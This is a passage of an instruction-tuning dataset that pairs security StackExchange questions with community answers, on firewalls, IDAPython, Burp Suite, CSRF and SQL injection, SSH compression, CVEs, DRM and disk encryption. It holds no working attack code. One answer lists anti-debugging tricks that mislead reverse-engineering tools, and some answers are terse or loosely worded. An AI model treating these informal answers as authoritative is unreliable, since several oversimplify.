      "answer": "At the very basic level Firewall is a device that applies security policy by looking at packet's header. Firewalls are not made to look at the payload of the packet. \nIT industry has split the responsibility of firewalling and IDS/IPS into two separate devices due to performance considerations and complexity. \nSome of the latest firewalls can do both, but they do not have the complete ability to examine each payload of each packet for each known or unknown threat. Their ability is limited due to performance considerations. Hence a firewall cannot flag every suspicious thing.  \nMalwares, viruses, worms reside in the packet's payload even though that packet might comply with that firewall's security rule, and the firewall will allow it. \nIDS/IPS has the role to examine each payload, either by \"Pattern matching\" or \"Anomaly based\".\nPattern matching is based of matching patterns of bits in the payload to a set of signatures (or definitions). Firewalls don't do this. To detect flame, the IDS/IPS vendor has to provide a signature to detect it. \nAnomaly based is comparing suspicious behavior with learned normal behavior of that application in the past. Again firewalls can't do this. To detect flame, IDS/IPS has to learn the normal behavior first. The IDS/IPS vendor has to provide an update to the device for behavior of flame. \nHost based IDS/IPS can do a very good job in identifying and stopping an unknown threat. Example, Cisco CSA agents can detect and stop an unknown threat because it monitors behavior of system's processes very closely."
    }
  },
  {
    "instruction": "Q: Does IDAPython define any special environment variable?\nI have an IDAPython script written for a specific analysis. Also, I am using another in-house tool for the same analysis that, too, exposes Python API. My intention is to augment the script such that when it is run within IDA, it'll run IDA specific methods and when it is run outside IDA, it has to call the method specific to the in-house tool. Does IDAPython provide any special environment variable to detect if a Python script is running inside IDA environment?",
    "context": "",
    "output": " A: I don't think there is directly, but there is a trick I've seen a few times (works with any dependency):\ntry:\n    import idc\n    print 'ida'\nexcept Exception as e:\n    print 'no ida'\n\nYou may set a special variable instead of the print statements.\nDisclamer:\n\nRequires that your systems python and IDAs python are actually separate (the default case)",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does IDAPython define any special environment variable?\nI have an IDAPython script written for a specific analysis. Also, I am using another in-house tool for the same analysis that, too, exposes Python API. My intention is to augment the script such that when it is run within IDA, it'll run IDA specific methods and when it is run outside IDA, it has to call the method specific to the in-house tool. Does IDAPython provide any special environment variable to detect if a Python script is running inside IDA environment?",
      "answer": "I don't think there is directly, but there is a trick I've seen a few times (works with any dependency):\ntry:\n    import idc\n    print 'ida'\nexcept Exception as e:\n    print 'no ida'\n\nYou may set a special variable instead of the print statements.\nDisclamer:\n\nRequires that your systems python and IDAs python are actually separate (the default case)"
    }
  },
  {
    "instruction": "Question: Burp suite doesn't send accept-encoding header\nWhen I send a GET request with Burp, it doesn't have \"Accept-Encoding\" header on it's header. Because of that, I can't get a js file from a website (It returns 406 response). \nBut when I add \"Accept-Encoding: gzip\" header manually on Repeater section, application returns 200 response.\nI checked Firefox's \"about:config\" section, it's in default settings.\nI installed \"Modify Headers\" plugin to Firefox, add \"Accept-Encoding\" header. Still, I Don't see this on my request headers.\nI couldn't find any Burp plugin which adds custom header to requests. \nHow can I solve this issue?",
    "context": "",
    "output": "Answer: Under the proxy options there is a setting \"Strip Accept-Encoding headers in incoming requests\". Disable this if you want gzip encoded responses.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Burp suite doesn't send accept-encoding header\nWhen I send a GET request with Burp, it doesn't have \"Accept-Encoding\" header on it's header. Because of that, I can't get a js file from a website (It returns 406 response). \nBut when I add \"Accept-Encoding: gzip\" header manually on Repeater section, application returns 200 response.\nI checked Firefox's \"about:config\" section, it's in default settings.\nI installed \"Modify Headers\" plugin to Firefox, add \"Accept-Encoding\" header. Still, I Don't see this on my request headers.\nI couldn't find any Burp plugin which adds custom header to requests. \nHow can I solve this issue?",
      "answer": "Under the proxy options there is a setting \"Strip Accept-Encoding headers in incoming requests\". Disable this if you want gzip encoded responses."
    }
  },
  {
    "instruction": "Q: Advanced Anti-Debugging Techniques\nI was wondering what are some advanced AntiDebugging techniques that more advanced than the basic ones like IsDebuggerPresent and CheckRemoteDebuggerPresent?",
    "context": "",
    "output": " A: Similar to those 2 APIs, there are similar ways to check about the presence of debugger. For instance:\n\nChecking CPU Ticking\nTime it takes to complete a preknown action\nswitching from 64 to 32 and vice versa if supported (WOW)\nLoaded libraries(similar to ASLR bypassing) that might indicate the presence of a debugger or some sort of VM\nSpecific attacks to confuse the way a specific debugger or reversing tool interprets the data (For instance by abusing difference between sweeps, in IDA for instance linear Others)\nWriting a custom ASM that follows the program logic(meaning won't break the program), but will make the reversing tool give you incorrect information\n\nThose are just glimpses of the almost infinite ways to trick the debugger. However, a good reverser will overcome all of this eventually, but sometimes the goal is not make it cost efficient or confuse the reverser so he won't decide to spend time on it by making him think the purpose is other or that the functionality is lacking and something is broken. There are a lot of reasons and a lot of ways to overcome them, and vice-versa.\nHope I could help a bit.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Advanced Anti-Debugging Techniques\nI was wondering what are some advanced AntiDebugging techniques that more advanced than the basic ones like IsDebuggerPresent and CheckRemoteDebuggerPresent?",
      "answer": "Similar to those 2 APIs, there are similar ways to check about the presence of debugger. For instance:\n\nChecking CPU Ticking\nTime it takes to complete a preknown action\nswitching from 64 to 32 and vice versa if supported (WOW)\nLoaded libraries(similar to ASLR bypassing) that might indicate the presence of a debugger or some sort of VM\nSpecific attacks to confuse the way a specific debugger or reversing tool interprets the data (For instance by abusing difference between sweeps, in IDA for instance linear Others)\nWriting a custom ASM that follows the program logic(meaning won't break the program), but will make the reversing tool give you incorrect information\n\nThose are just glimpses of the almost infinite ways to trick the debugger. However, a good reverser will overcome all of this eventually, but sometimes the goal is not make it cost efficient or confuse the reverser so he won't decide to spend time on it by making him think the purpose is other or that the functionality is lacking and something is broken. There are a lot of reasons and a lot of ways to overcome them, and vice-versa.\nHope I could help a bit."
    }
  },
  {
    "instruction": "Answer the question below.\nDoes ISP have control on all routers in their network?\nWhen I was changing my router my ISP technician told me that he has remote access to all routers provided by ISP. Was that true? If that is a fact it scares me...",
    "context": "",
    "output": "Go home, plug a new router into the ISP router, or if you're courageous, replace the ISP router with your own router. Set the admin password to a 32 character \"Horse Battery Staple Kumquat\" value.\nNow ask whether the ISP has access to all routers connected to their network.\nThe admin told you what it is useful (to him) for you to believe.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does ISP have control on all routers in their network?\nWhen I was changing my router my ISP technician told me that he has remote access to all routers provided by ISP. Was that true? If that is a fact it scares me...",
      "answer": "Go home, plug a new router into the ISP router, or if you're courageous, replace the ISP router with your own router. Set the admin password to a 32 character \"Horse Battery Staple Kumquat\" value.\nNow ask whether the ISP has access to all routers connected to their network.\nThe admin told you what it is useful (to him) for you to believe."
    }
  },
  {
    "instruction": "Can you tell me the answer to: Anti-CSFR tokens and SQLi\nI follow a SQLi tool on github and recently saw a conversation between the developer and a user. The user had tried to inject and gotten some errors, in the requests there was a anti-csfr token. The developer then told the user that they didn't know what they were dealing with and closed the issue, because one, they were trying to force an incorrect database, and two, they had gotten the token. Now I'm not saying that the developer is wrong, I'm just curious.\nIf I'm correct, CSFR, and SQLi are two completely different vulnerabilities and do not correspond with one another. If you have a token that's all fine and dandy, but it's not going to help you with SQLi. \nSo my question is, what does an anti-CSFR token and SQLi have anything to do with one another, do they go hand in hand? \nI'm pretty sure they don't, but I've been wrong before.",
    "context": "",
    "output": "answer: The only relation I see is that the server might abort if the CSRF token is invalid before running any SQL, so you would need to have the CSRF token to exploit an SQL injection vulnerability.\nOf course this would only apply to requests that include CSRF validation, which is generally limited to POST requests, and if there's an SQL injection vulnerability in a POST request there's probably one in a GET request somewhere too.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Anti-CSFR tokens and SQLi\nI follow a SQLi tool on github and recently saw a conversation between the developer and a user. The user had tried to inject and gotten some errors, in the requests there was a anti-csfr token. The developer then told the user that they didn't know what they were dealing with and closed the issue, because one, they were trying to force an incorrect database, and two, they had gotten the token. Now I'm not saying that the developer is wrong, I'm just curious.\nIf I'm correct, CSFR, and SQLi are two completely different vulnerabilities and do not correspond with one another. If you have a token that's all fine and dandy, but it's not going to help you with SQLi. \nSo my question is, what does an anti-CSFR token and SQLi have anything to do with one another, do they go hand in hand? \nI'm pretty sure they don't, but I've been wrong before.",
      "answer": "The only relation I see is that the server might abort if the CSRF token is invalid before running any SQL, so you would need to have the CSRF token to exploit an SQL injection vulnerability.\nOf course this would only apply to requests that include CSRF validation, which is generally limited to POST requests, and if there's an SQL injection vulnerability in a POST request there's probably one in a GET request somewhere too."
    }
  },
  {
    "instruction": "Please answer this question: Does it weaken the encryption of SSH to use compression?\nWhen using compression on openssh (a la ssh -C ...), does this reduce entropy and make the tunnel traffic more vulnerable to cryptanalysis? Is compression an option I should disable server-side for this or any other reason? \nI have a vague recollection of disabling compression being recommended for security reasons, but the rationale (if any) eludes me and my feeble Google queries.",
    "context": "",
    "output": "Compression before encryption is a problem if the attacker can control parts of the transferred data and then use the detectable compression ratio (i.e. amount of transferred data vs. original data) to make conclusions about some of the traffic. This was in TLS used within BREACH and CRIME attacks to infer cookies and CSRF tokens. Making such attacks work requires the attacker to trigger repeated transmission of mostly the same data where the only difference is the attacker controlled part. This is feasible in several use cases of HTTPS.\nWhile one might in theory use SSH in a similar scenario the common use case of SSH is not like this, i.e. the attacker has no control over parts of the input and can also not trigger sending nearly the same data again and again. In the common use cases of SSH compression before encryption is thus not a problem.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Does it weaken the encryption of SSH to use compression?\nWhen using compression on openssh (a la ssh -C ...), does this reduce entropy and make the tunnel traffic more vulnerable to cryptanalysis? Is compression an option I should disable server-side for this or any other reason? \nI have a vague recollection of disabling compression being recommended for security reasons, but the rationale (if any) eludes me and my feeble Google queries.",
      "answer": "Compression before encryption is a problem if the attacker can control parts of the transferred data and then use the detectable compression ratio (i.e. amount of transferred data vs. original data) to make conclusions about some of the traffic. This was in TLS used within BREACH and CRIME attacks to infer cookies and CSRF tokens. Making such attacks work requires the attacker to trigger repeated transmission of mostly the same data where the only difference is the attacker controlled part. This is feasible in several use cases of HTTPS.\nWhile one might in theory use SSH in a similar scenario the common use case of SSH is not like this, i.e. the attacker has no control over parts of the input and can also not trigger sending nearly the same data again and again. In the common use cases of SSH compression before encryption is thus not a problem."
    }
  },
  {
    "instruction": "Answer the following question:\n\nTKIP key length and initialization vector size\nIt's not clear to me from reading the wiki if TKIP encryption uses a 128 bit RC4 encryption key and a 48 bit IV, or if the 128 bit is the total, and the actual key size is 128 - 48 = 80 bit.",
    "context": "",
    "output": "It uses 128 bit RC4 and 48 bit IV",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "TKIP key length and initialization vector size\nIt's not clear to me from reading the wiki if TKIP encryption uses a 128 bit RC4 encryption key and a 48 bit IV, or if the 128 bit is the total, and the actual key size is 128 - 48 = 80 bit.",
      "answer": "It uses 128 bit RC4 and 48 bit IV"
    }
  },
  {
    "instruction": "Answer the following question:\n\nHow to edit (insert new fields into) IDA structures?\nI'm trying to reverse a bigger structure used in an old game. Obviously I didn't know all fields when I created the structure type, and now I want to edit in some new fields / change pure byte gaps into meaningful fields.\nThis, for example, is a structure of a GuiButton which I know by now, but it's just a gap yet:\n\nI don't find any way to edit the field of the structure. Do I have to completely delete the existing structure and create a new one?",
    "context": "",
    "output": "You can undefine the field (select Undefine from the context menu or press U) and then press D to define a new field in the gap.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How to edit (insert new fields into) IDA structures?\nI'm trying to reverse a bigger structure used in an old game. Obviously I didn't know all fields when I created the structure type, and now I want to edit in some new fields / change pure byte gaps into meaningful fields.\nThis, for example, is a structure of a GuiButton which I know by now, but it's just a gap yet:\n\nI don't find any way to edit the field of the structure. Do I have to completely delete the existing structure and create a new one?",
      "answer": "You can undefine the field (select Undefine from the context menu or press U) and then press D to define a new field in the gap."
    }
  },
  {
    "instruction": "Can you tell me the answer to: When to apply for a CVE?\nWhen you find a vulnerability, do you contact CVE assigners before contacting the vendor or after the vendor has fixed the problem?\nPS: do not link to How are CVE identifiers assigned and managed?, as it doesn't answer my question.",
    "context": "",
    "output": "answer: You can request a CVE number without the details being published.\nThe timeline I have previously followed is:\n\nNotify vendor\nRequest CVE number, while waiting for vendor response\nPublish advisory, once issue is fixed or a certain amount of time has passed\n\nI consider the CVE guys reasonably trustworthy, and I will disclose high-level details of the vulnerability to them before I published. They need this to avoid duplicates, but you can tell them to keep details private. If someone searches for the CVE at this point, it just says \"reserved\". When I publish, I copy the CVE guys and they then update the CVE entry to include the information.\nYou do need to get the CVE before you publish - it's pretty much essential to include a CVE number on your advisory.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "When to apply for a CVE?\nWhen you find a vulnerability, do you contact CVE assigners before contacting the vendor or after the vendor has fixed the problem?\nPS: do not link to How are CVE identifiers assigned and managed?, as it doesn't answer my question.",
      "answer": "You can request a CVE number without the details being published.\nThe timeline I have previously followed is:\n\nNotify vendor\nRequest CVE number, while waiting for vendor response\nPublish advisory, once issue is fixed or a certain amount of time has passed\n\nI consider the CVE guys reasonably trustworthy, and I will disclose high-level details of the vulnerability to them before I published. They need this to avoid duplicates, but you can tell them to keep details private. If someone searches for the CVE at this point, it just says \"reserved\". When I publish, I copy the CVE guys and they then update the CVE entry to include the information.\nYou do need to get the CVE before you publish - it's pretty much essential to include a CVE number on your advisory."
    }
  },
  {
    "instruction": "What is the answer to this question - failed login attempts analysis\nIs there any open source project that logs all the failed login attempts over a period of time and gives me analysis of the same,\nthe login failure is at windows or unix or mac user authentication over rdp,telnet or login screens or any other forms\n\n",
    "context": "",
    "output": "If you want to do log analysis in general you can use Splunk or something alike and just introduce all logs. You just have to create a query for your different files (I suggest putting them in one index). After that you can just create a timegraph and and piecharts to see when, where and how much people have tried to log in. It's not opensource though. Only parts of it are opensource and it's not cheap if you have more than 500 MB  of logs per day. There is a complete opensource alternative called logstash.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "failed login attempts analysis\nIs there any open source project that logs all the failed login attempts over a period of time and gives me analysis of the same,\nthe login failure is at windows or unix or mac user authentication over rdp,telnet or login screens or any other forms",
      "answer": "If you want to do log analysis in general you can use Splunk or something alike and just introduce all logs. You just have to create a query for your different files (I suggest putting them in one index). After that you can just create a timegraph and and piecharts to see when, where and how much people have tried to log in. It's not opensource though. Only parts of it are opensource and it's not cheap if you have more than 500 MB  of logs per day. There is a complete opensource alternative called logstash."
    }
  },
  {
    "instruction": "Question: Sharing sensitive information across servers on visits from the same browser\nI have this scenario:\n\nWebserver domain A. Generates sensitive information when a request from a browser is received but this information is not disclosed to the browser.\nWebserver domain B. Processes the information generated by webserver A on receiving a petition from the very same browser which contacted webserver A.\n\nCommunication between the browser and webservers is secured (https).\nWebservers can communicate directly and securely with each other\nHow could I implement this scheme in a simple and secure way?\nThanks",
    "context": "",
    "output": "Answer: Without more data I can only hint at some ideas.\nI see two basic strategies:\n\nEncryption: Webserver B has a public/private key. Webserver a knows B's public key. When the client makes the request to A, A returns the data encrypted with B's public key. The browser then passes the information to B for processing. \nSide channel: When the browser contacts A, a token is returned. The browser passes the token to B. B then contacts A directly, likely authenticating to A, and passes A the token. A, upon seeing the token and that the current user is B, sends the data directly to B.\n\nHope this helps. Add more information to your question if you want more specifics.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Sharing sensitive information across servers on visits from the same browser\nI have this scenario:\n\nWebserver domain A. Generates sensitive information when a request from a browser is received but this information is not disclosed to the browser.\nWebserver domain B. Processes the information generated by webserver A on receiving a petition from the very same browser which contacted webserver A.\n\nCommunication between the browser and webservers is secured (https).\nWebservers can communicate directly and securely with each other\nHow could I implement this scheme in a simple and secure way?\nThanks",
      "answer": "Without more data I can only hint at some ideas.\nI see two basic strategies:\n\nEncryption: Webserver B has a public/private key. Webserver a knows B's public key. When the client makes the request to A, A returns the data encrypted with B's public key. The browser then passes the information to B for processing. \nSide channel: When the browser contacts A, a token is returned. The browser passes the token to B. B then contacts A directly, likely authenticating to A, and passes A the token. A, upon seeing the token and that the current user is B, sends the data directly to B.\n\nHope this helps. Add more information to your question if you want more specifics."
    }
  },
  {
    "instruction": "Answer this question:\n\nPotential consequences of using \"Everyone\" to manage permissions?\nIf a web application is set to run using a specific account, could a malicious user do something they shouldn't if I use the \"Everyone\" account to manage permissions on a folder on the server?  The folder is used by that web application to read/write files.\nI probably left something out here, so please let me know if you need more info.",
    "context": "",
    "output": "A: I highly recommend against using \"everyone\" as this grants permissions to users/people/entities who aren't even part of your domain or user base. \nA malicious user can only do what your permissions allow (read, write, modify, etc) however, by using \"everyone\" you are inadvertently granting access to more people than you may realize. \nI recommend creating a local users group and populating that local users group with your domain users group. Then grant the local users group permissions to the data. \nAlso, assuming this is IIS, the account that the application pool runs as and the account the users actually authenticate to the content as are two different things.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Potential consequences of using \"Everyone\" to manage permissions?\nIf a web application is set to run using a specific account, could a malicious user do something they shouldn't if I use the \"Everyone\" account to manage permissions on a folder on the server?  The folder is used by that web application to read/write files.\nI probably left something out here, so please let me know if you need more info.",
      "answer": "I highly recommend against using \"everyone\" as this grants permissions to users/people/entities who aren't even part of your domain or user base. \nA malicious user can only do what your permissions allow (read, write, modify, etc) however, by using \"everyone\" you are inadvertently granting access to more people than you may realize. \nI recommend creating a local users group and populating that local users group with your domain users group. Then grant the local users group permissions to the data. \nAlso, assuming this is IIS, the account that the application pool runs as and the account the users actually authenticate to the content as are two different things."
    }
  },
  {
    "instruction": "Answer the question below.\nAttacking through an open but not listened port\nLet us say, we open a port, say port 123, so that upon listening, an application on the server can receive incoming packets through the port 123. \nIf there is no way that an inside application on the server listens the port 123, how can an attacker use this open port to attack the server?",
    "context": "",
    "output": "If there is no application listening to a port, the operating system will reject incoming packages sent to this port. So no attack is possible related to intrusion into the system via this port.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Attacking through an open but not listened port\nLet us say, we open a port, say port 123, so that upon listening, an application on the server can receive incoming packets through the port 123. \nIf there is no way that an inside application on the server listens the port 123, how can an attacker use this open port to attack the server?",
      "answer": "If there is no application listening to a port, the operating system will reject incoming packages sent to this port. So no attack is possible related to intrusion into the system via this port."
    }
  },
  {
    "instruction": "Vulnerability scanning: White list pentester or not?\nIf your company engages a third party pentester to do vulnerability scanning, do you \n\nwhitelist the pentester so that they can thoroughly scan the machines on the internet, or \ndo not whitelist them so that you have a better gauge of the effectiveness of your countermeasures?",
    "context": "",
    "output": "If you are getting your network assessed for the first time I would suggest giving the pentesters complete access.\nYou will get a report that is comprehensive which would include all the vulnerabilities that exists in your assets.\nThis will give you the complete understanding to plan upgrading the security of your network.\nMoreover, during a pentest, the testers attempt a large number of attacks within a very short time. Please remember that in practice, an attacker might try these attacks slowly, over a longer period of time, and slip beneath the radar. To enable the testers to test efficiently, white-listing the testers is a essential.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Vulnerability scanning: White list pentester or not?\nIf your company engages a third party pentester to do vulnerability scanning, do you \n\nwhitelist the pentester so that they can thoroughly scan the machines on the internet, or \ndo not whitelist them so that you have a better gauge of the effectiveness of your countermeasures?",
      "answer": "If you are getting your network assessed for the first time I would suggest giving the pentesters complete access.\nYou will get a report that is comprehensive which would include all the vulnerabilities that exists in your assets.\nThis will give you the complete understanding to plan upgrading the security of your network.\nMoreover, during a pentest, the testers attempt a large number of attacks within a very short time. Please remember that in practice, an attacker might try these attacks slowly, over a longer period of time, and slip beneath the radar. To enable the testers to test efficiently, white-listing the testers is a essential."
    }
  },
  {
    "instruction": "Question: How do browsers make sure their setting page is secure\nTake a look at below picture.\n\nThis page is not loaded over https, so how do modern browsers make sure this page is secure?",
    "context": "",
    "output": "Answer: This page is not loaded over https\n\nIt's not loaded over anything. The browser is just displaying it within a browser frame because that frame already has the ability to display web forms so the same code is used to display this form, even though it doesn't come from the web.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "How do browsers make sure their setting page is secure\nTake a look at below picture.\n\nThis page is not loaded over https, so how do modern browsers make sure this page is secure?",
      "answer": "This page is not loaded over https\n\nIt's not loaded over anything. The browser is just displaying it within a browser frame because that frame already has the ability to display web forms so the same code is used to display this form, even though it doesn't come from the web."
    }
  },
  {
    "instruction": "Answer the following question:\n\nManipulate EIP in Immunity Debugger\nI just was playing around with Windbg, debugging some application. \nAt some point I had to manipulate EIP which was pretty easy in Windbg. But then once I switched back to Immunity, I could not figure out how to do the same thing.\nIs there some way you can change the EIP inside Immunity?",
    "context": "",
    "output": "Right click the code, select 'New Origin here' done",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Manipulate EIP in Immunity Debugger\nI just was playing around with Windbg, debugging some application. \nAt some point I had to manipulate EIP which was pretty easy in Windbg. But then once I switched back to Immunity, I could not figure out how to do the same thing.\nIs there some way you can change the EIP inside Immunity?",
      "answer": "Right click the code, select 'New Origin here' done"
    }
  },
  {
    "instruction": "Why are my gpg public key on my machine and on the key server different?\nWhen I generated my PGP key using GnuPG, I had saved the public key as an ASCII version and uploaded that to the server. Now I can see the key on the keyserver but they are different blocks of data.\nI have  a local copy of the above key obtained with gpg --export -a 33E0C879 > mypubkey.asc. The contents of mypubkey.asc and the content block on the server are different.\nIs this by design? I am  new to PKI and very curious to know.",
    "context": "",
    "output": "There are lots of reasons for this.\n\nKeyservers can modify the order of your keys, signatures, ... occuring without changing the meaning of the data\nLots of keyservers ommit picture UIDs\nThe keyserver could know more signatures on your key than your local keyring does\n\nYou may not compare the contents of the (binary|ascii armored) version of your exported key by comparing them directly, only reimport them and compare the output of eg. gnupg. Remember sorting is irrelevant.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Why are my gpg public key on my machine and on the key server different?\nWhen I generated my PGP key using GnuPG, I had saved the public key as an ASCII version and uploaded that to the server. Now I can see the key on the keyserver but they are different blocks of data.\nI have  a local copy of the above key obtained with gpg --export -a 33E0C879 > mypubkey.asc. The contents of mypubkey.asc and the content block on the server are different.\nIs this by design? I am  new to PKI and very curious to know.",
      "answer": "There are lots of reasons for this.\n\nKeyservers can modify the order of your keys, signatures, ... occuring without changing the meaning of the data\nLots of keyservers ommit picture UIDs\nThe keyserver could know more signatures on your key than your local keyring does\n\nYou may not compare the contents of the (binary|ascii armored) version of your exported key by comparing them directly, only reimport them and compare the output of eg. gnupg. Remember sorting is irrelevant."
    }
  },
  {
    "instruction": "Answer this question:\n\nEffect of FDE for data recovery\nAssume that I fully encrypt an unused USB (FDE), then format it and copy plaintext files. If the files are deleted from USB by using a secure wipe, does FDE that was first applied decrease the possibility of recovering files?",
    "context": "",
    "output": "A: Not really, no.\nI'm reading this version of the question as\n\nI fully encrypt an unused USB (FDE), then format it\n\nequivalent to randomize then format. Then \n\nfiles are deleted from USB by using a secure wipe\n\nboils down to simply how good your secure wipe functions. The past history of the media can make manual examination a little bit more difficult as zeroes are easier to filter out than random. But the bottom line is still how well your secure wipe functions.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "Effect of FDE for data recovery\nAssume that I fully encrypt an unused USB (FDE), then format it and copy plaintext files. If the files are deleted from USB by using a secure wipe, does FDE that was first applied decrease the possibility of recovering files?",
      "answer": "Not really, no.\nI'm reading this version of the question as\n\nI fully encrypt an unused USB (FDE), then format it\n\nequivalent to randomize then format. Then \n\nfiles are deleted from USB by using a secure wipe\n\nboils down to simply how good your secure wipe functions. The past history of the media can make manual examination a little bit more difficult as zeroes are easier to filter out than random. But the bottom line is still how well your secure wipe functions."
    }
  },
  {
    "instruction": "Question: DRM Video encryption\nI had some work where I needed to secure streaming. So I looked over all DRM protections that are currently available, and then I found out that I had 3 opinions, first to use very expensive DRM (Adobe) that would cost fortune, second one was to use some cheap one which require installation of some bad quality plugins and doesn't have support for all browsers and third one was to use AES-128 encription which is not really DRM, but can handle some things. Then I start thinking, and here is what I did. \nI created streaming server that will:\nCreate separate key for EVERY chunk in EVERY session, that means that key never repeats. chunks are relatively small 1chunk per 3 seconds. then I encoded key by base64 and got 24 bytes that were exactly 192 bits which is same length as AES-192, After that I shifted every byte for specific number of spaces, for each character different shift and replaced padding of 64 with some random chars. As a result I got unrecognizable base64 which looks like random key. Then after that I did reverse in the flash player. and as a result I got player working pretty good. And changed player to fake aes 192 by m3u8 playlist information.\nSo basically site is intended for small language group of people (around 12mil) and generally doesn't have very valuable content (videos that are valuable for students). Now What do you think, what is possibility for someone to find out what is goung on and how to decrypt (basically i believe they will try to decode first as AES-192 because of key length and m3u8 info)? Do you thinkthis is enough secure for low budget in low salary country?",
    "context": "",
    "output": "Answer: Let's get this out of the way first: DRM is not a solvable problem.\nSimply loading the flash player into a reverse engineering tool and reading the code will reveal what you did, and since you're giving them the key they can just decrypt the video. It's something anyone familiar with Flash reverse engineering could do, and it's probably something you could pick up from Google if you've got a background in general code and security concepts.\nIf you're looking for something more solid, you could look into solutions which use HDCP, which essentially provides end-to-end encryption of content up to the actual display device (e.g. a computer monitor). However, this may limit your userbase, as the HDCP feature was designed primarily for use in devices like BluRay players where TVs are known to support HDCP, rather than cases like computer monitors which may not (though many do).\nAll in all, you just have to decide how much effort you want to put in as a deterrant. If someone wants your video, they can capture it just fine using a screen capture application (e.g. Fraps) or exploit the analog hole.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "DRM Video encryption\nI had some work where I needed to secure streaming. So I looked over all DRM protections that are currently available, and then I found out that I had 3 opinions, first to use very expensive DRM (Adobe) that would cost fortune, second one was to use some cheap one which require installation of some bad quality plugins and doesn't have support for all browsers and third one was to use AES-128 encription which is not really DRM, but can handle some things. Then I start thinking, and here is what I did. \nI created streaming server that will:\nCreate separate key for EVERY chunk in EVERY session, that means that key never repeats. chunks are relatively small 1chunk per 3 seconds. then I encoded key by base64 and got 24 bytes that were exactly 192 bits which is same length as AES-192, After that I shifted every byte for specific number of spaces, for each character different shift and replaced padding of 64 with some random chars. As a result I got unrecognizable base64 which looks like random key. Then after that I did reverse in the flash player. and as a result I got player working pretty good. And changed player to fake aes 192 by m3u8 playlist information.\nSo basically site is intended for small language group of people (around 12mil) and generally doesn't have very valuable content (videos that are valuable for students). Now What do you think, what is possibility for someone to find out what is goung on and how to decrypt (basically i believe they will try to decode first as AES-192 because of key length and m3u8 info)? Do you thinkthis is enough secure for low budget in low salary country?",
      "answer": "Let's get this out of the way first: DRM is not a solvable problem.\nSimply loading the flash player into a reverse engineering tool and reading the code will reveal what you did, and since you're giving them the key they can just decrypt the video. It's something anyone familiar with Flash reverse engineering could do, and it's probably something you could pick up from Google if you've got a background in general code and security concepts.\nIf you're looking for something more solid, you could look into solutions which use HDCP, which essentially provides end-to-end encryption of content up to the actual display device (e.g. a computer monitor). However, this may limit your userbase, as the HDCP feature was designed primarily for use in devices like BluRay players where TVs are known to support HDCP, rather than cases like computer monitors which may not (though many do).\nAll in all, you just have to decide how much effort you want to put in as a deterrant. If someone wants your video, they can capture it just fine using a screen capture application (e.g. Fraps) or exploit the analog hole."
    }
  },
  {
    "instruction": "What is the answer to this question - HDD password vs Bitlocker\nI have a Samsung SSD 850 with an HDD password set. It seems from articles such as this and this that the data is fully encrypted, and requires the password to view. Is there any requirement or advantage to having Bitlocker as well?\n\n",
    "context": "",
    "output": "There's no practical way to inspect the Samsung disk's implementation of AES-256.  The same is true of the Bitlocker algorithm, but the software implementation has a few advantages:\n\nMicrosoft can issue patches if vulnerabilities are discovered\nRuntime entropy sources are more varied than whatever entropy source is used to encrypt the Samsung disk  (remember that these disks ship encrypted, the password merely scrambling the keys.  If you can find information about how the disk is initialized and entropy is generated, I would love to hear it.)\nIn software you can inspect the raw disk image to ensure the content is being encrypted.\n\nThere was a similar question on this a few years ago:\nIs hardware based disk encryption more secure that software based?\nThis said, I actively use this kind of disk-level encryption, but I'm only considering a threat model where a break-in to my apartment causes somebody to snag my hardware... no state secrets here.",
    "category": "StackExchangeFlan",
    "instruction_type": "natural_questions",
    "parsed_raw_data": {
      "question": "HDD password vs Bitlocker\nI have a Samsung SSD 850 with an HDD password set. It seems from articles such as this and this that the data is fully encrypted, and requires the password to view. Is there any requirement or advantage to having Bitlocker as well?",
      "answer": "There's no practical way to inspect the Samsung disk's implementation of AES-256.  The same is true of the Bitlocker algorithm, but the software implementation has a few advantages:\n\nMicrosoft can issue patches if vulnerabilities are discovered\nRuntime entropy sources are more varied than whatever entropy source is used to encrypt the Samsung disk  (remember that these disks ship encrypted, the password merely scrambling the keys.  If you can find information about how the disk is initialized and entropy is generated, I would love to hear it.)\nIn software you can inspect the raw disk image to ensure the content is being encrypted.\n\nThere was a similar question on this a few years ago:\nIs hardware based disk encryption more secure that software based?\nThis said, I actively use this kind of disk-level encryption, but I'm only considering a threat model where a break-in to my apartment causes somebody to snag my hardware... no state secrets here."
    }
  },
  {
    "instruction": "Answer this question:\n\nDetecting different jailbreaks\nI am using an application that shuts down and quits when it detects a jailbroken phone. \nIs it possible that this application only detects some kinds of jailbreaks and not others? Or do applications generally detect jailbreaks by the result rather than the process?",
    "context": "",
